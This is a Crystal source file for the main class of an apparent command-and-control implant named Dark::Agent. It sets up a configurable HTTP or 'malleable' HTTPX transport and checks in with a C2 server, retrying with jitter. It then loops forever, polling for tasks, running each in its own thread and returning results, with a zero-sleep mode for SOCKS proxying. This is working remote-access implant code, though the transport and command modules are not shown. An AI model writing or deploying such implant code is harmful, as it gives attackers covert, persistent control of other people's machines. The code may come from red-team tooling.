require "./transport"
require "./config"

module Dark::Agent
  class Base
    @transport : Transport::Base
    @config : Config::Base
    @command_handler : CommandHandler

    # Initialize the agent with the configured transport and command handler
    # Sets up the communication channel based on the profile configuration
    def initialize
      # Create config instance using the factory method
      @config = Config.create

      # Create transport instance and pass our config to it
      @transport = Transport.create(@config)

      # Create command handler and pass the config
      @command_handler = CommandHandler.new(@config)

      # Set config for MessageHandler and initialize SOCKS processor
      MessageHandler.set_config(@config)

      # Show detailed profile info in debug logs
      transport_type = {% if flag?(:httpx_profile) %}
        "HTTPX (malleable)"
      {% else %}
        "HTTP (standard)"
      {% end %}

      log_debug("Transport class: #{transport_type}")
      log_debug("Config class: #{@config.class}")
    end

    # Runs the agent's main execution flow. This method:
    # 1. Attempts to establish initial check-in with the C2 server
    # 2. Retries with jitter if check-in fails
    # 3. Once connected, enters the main command execution loop
    # 4. Continuously polls for tasks, executes them, and sends results
    # This method never returns unless the process is terminated
    def run
      log_debug("Agent starting...")

      # Loop until successful checkin
      successful_checkin = false
      until successful_checkin
        log_debug("Attempting initial checkin...")
        successful_checkin = @transport.send_checkin

        unless successful_checkin
          # Sleep with jitter before retrying
          jitter_percent = @config.jitter_percent
          if jitter_percent > 0
            jitter_seconds = (@config.sleep_interval * (100 + Random.rand(jitter_percent)) / 100.0).to_i
          else
            jitter_seconds = @config.sleep_interval
          end
          log_error("Checkin failed, sleeping for #{jitter_seconds} seconds before retry")
          sleep(jitter_seconds.seconds)
        end
      end

      log_warn("Checkin successful, beginning task loop")

      # Main task loop
      loop do
        # Send any queued responses
        @transport.send_responses

        # Get and process any tasks
        tasks = @transport.receive_tasks

        # Execute each task in a separate thread
        unless tasks.empty?
          tasks.each do |task|
            spawn do
              @command_handler.execute(task.to_json)
            end
          end
        end

        # Only sleep if we're not in zero-sleep polling mode (high-speed SOCKS optimization)
        # For sleep=0, we want to continuously poll without any delays
        if @config.sleep_interval != 0
          @transport.sleep_with_jitter
        end
      end
    end
  end
end